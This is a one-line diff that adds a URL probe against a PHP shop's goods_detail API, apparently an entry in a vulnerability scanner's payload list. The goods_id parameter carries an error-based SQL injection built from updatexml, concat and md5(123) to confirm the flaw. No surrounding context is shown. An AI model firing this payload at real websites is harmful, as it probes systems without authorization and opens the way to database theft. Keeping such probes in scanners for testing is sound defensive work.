@@ -1,0 +1,1 @@
+/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)
